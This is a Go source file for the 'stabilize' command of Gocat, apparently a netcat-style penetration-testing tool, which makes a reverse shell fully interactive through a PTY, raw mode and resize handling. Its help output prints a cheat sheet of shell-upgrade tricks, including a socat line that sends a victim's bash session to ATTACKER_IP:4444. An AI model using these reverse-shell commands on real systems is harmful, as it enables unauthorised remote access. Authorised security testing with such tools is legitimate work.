package cmd

import (
	"fmt"
	"io"
	"os"
	"os/exec"
	"os/signal"
	"syscall"
	"time"

	"github.com/creack/pty"
	"github.com/realibrahimsql/Gocat/internal/logger"
	"github.com/realibrahimsql/Gocat/internal/terminal"
	"github.com/spf13/cobra"
)

var (
	stabilizeShell   string
	stabilizeResize  bool
	stabilizeUpgrade bool
	stabilizeMethod  string
)

var stabilizeCmd = &cobra.Command{
	Use:   "stabilize",
	Short: "Stabilize a reverse shell to make it fully interactive",
	Long: `Stabilize a reverse shell by:
- Allocating a PTY (pseudo-terminal)
- Enabling terminal resize support (SIGWINCH)
- Setting proper terminal settings (raw mode, echo)
- Providing upgrade methods (Python, script, socat)

This makes reverse shells behave like native SSH connections with:
- Arrow keys working properly
- Ctrl+C not killing the shell
- Tab completion working
- Text editors (vim, nano) working
- Full terminal features (colors, cursor control)

Examples:
  # Basic stabilization
  gocat stabilize
  
  # With automatic resize handling
  gocat stabilize --resize
  
  # Using Python upgrade method
  gocat stabilize --upgrade --method python
  
  # Custom shell
  gocat stabilize --shell /bin/zsh --resize`,
	Run: runStabilize,
}

func init() {
	rootCmd.AddCommand(stabilizeCmd)

	stabilizeCmd.Flags().StringVar(&stabilizeShell, "shell", "/bin/bash", "Shell to use for stabilization")
	stabilizeCmd.Flags().BoolVar(&stabilizeResize, "resize", true, "Enable automatic terminal resize")
	stabilizeCmd.Flags().BoolVar(&stabilizeUpgrade, "upgrade", false, "Show upgrade methods instead of stabilizing")
	stabilizeCmd.Flags().StringVar(&stabilizeMethod, "method", "auto", "Upgrade method: auto, python, script, socat")
}

func runStabilize(cmd *cobra.Command, args []string) {
	if stabilizeUpgrade {
		showUpgradeMethods()
		return
	}

	if err := stabilizeCurrentShell(); err != nil {
		logger.Fatal("Stabilization failed: %v", err)
	}
}

func stabilizeCurrentShell() error {
	logger.Info("Stabilizing shell...")

	// Create PTY
	cmd := exec.Command(stabilizeShell, "-i")

	ptmx, err := pty.Start(cmd)
	if err != nil {
		return fmt.Errorf("failed to start PTY: %v", err)
	}
	defer func() {
		_ = ptmx.Close()
	}()

	// Set stdin to raw mode with signal-safe restore: any exit path
	// (return, Fatal, SIGTERM/SIGHUP) restores the user's terminal.
	restore, err := terminal.Guard()
	if err != nil {
		return fmt.Errorf("failed to set raw mode: %v", err)
	}
	defer restore()

	// Externally delivered SIGINT exits only after restoring the terminal.
	sigint := make(chan os.Signal, 1)
	signal.Notify(sigint, syscall.SIGINT)
	defer signal.Stop(sigint)
	go func() {
		<-sigint
		restore()
		fmt.Fprintln(os.Stderr, "\n[stabilize] interrupted, terminal restored.")
		os.Exit(130)
	}()

	// Handle terminal resize if enabled
	if stabilizeResize {
		cleanupResize := setupStabilizeResize(ptmx)
		defer cleanupResize()
	}

	// Copy stdin to PTY and PTY to stdout
	go func() {
		_, _ = io.Copy(ptmx, os.Stdin)
	}()

	logger.Info("Shell stabilized! Press Ctrl+D to exit.")
	logger.Info("Features enabled: PTY, raw mode, resize: %v", stabilizeResize)

	// Add small delay to show message
	time.Sleep(500 * time.Millisecond)

	_, _ = io.Copy(os.Stdout, ptmx)

	return nil
}

func showUpgradeMethods() {
	theme := logger.GetCurrentTheme()

	theme.Highlight.Print("\nReverse Shell Upgrade Methods\n\n")

	methods := map[string]string{
		"Python": `# Method 1: Python PTY
python -c 'import pty; pty.spawn("/bin/bash")'
export TERM=xterm
# Press Ctrl+Z to background
stty raw -echo; fg
# Press Enter twice
reset`,

		"Script": `# Method 2: Script command
script /dev/null -c bash
export TERM=xterm
# Press Ctrl+Z to background
stty raw -echo; fg
# Press Enter twice`,

		"Socat": `# Method 3: Socat (if available)
# On attacker machine:
socat file:'tty',raw,echo=0 tcp-listen:4444

# On victim machine:
socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:ATTACKER_IP:4444`,

		"Expect": `# Method 4: Expect (if available)
expect -c 'spawn bash; interact'`,

		"Perl": `# Method 5: Perl
perl -e 'exec "/bin/bash";'`,

		"stty": `# Method 6: Manual stty
# Get terminal size on attacker:
stty size
# Outputs: rows cols (e.g., 24 80)

# On reverse shell:
stty rows 24 cols 80
export TERM=xterm`,
	}

	// Determine which method to show
	if stabilizeMethod == "auto" || stabilizeMethod == "all" {
		// Show all methods
		for name, commands := range methods {
			theme.Success.Printf("%s:\n", name)
			fmt.Println(commands)
			fmt.Println()
		}
	} else {
		// Show specific method
		var methodName string
		switch stabilizeMethod {
		case "python":
			methodName = "Python"
		case "script":
			methodName = "Script"
		case "socat":
			methodName = "Socat"
		case "expect":
			methodName = "Expect"
		case "perl":
			methodName = "Perl"
		case "stty":
			methodName = "stty"
		default:
			logger.Error("Unknown method: %s", stabilizeMethod)
			logger.Info("Available methods: python, script, socat, expect, perl, stty, all")
			return
		}

		if cmd, ok := methods[methodName]; ok {
			theme.Success.Printf("%s:\n", methodName)
			fmt.Println(cmd)
		}
	}

	theme.Highlight.Print("\nQuick Tips:\n")
	fmt.Println("1. Always background (Ctrl+Z) before running 'stty raw -echo'")
	fmt.Println("2. Type 'reset' if terminal gets messed up")
	fmt.Println("3. Use 'export TERM=xterm' for proper terminal handling")
	fmt.Println("4. Check shell with: echo$TERM")
	fmt.Println("5. Test with: vim, nano, or arrow keys in history")
}
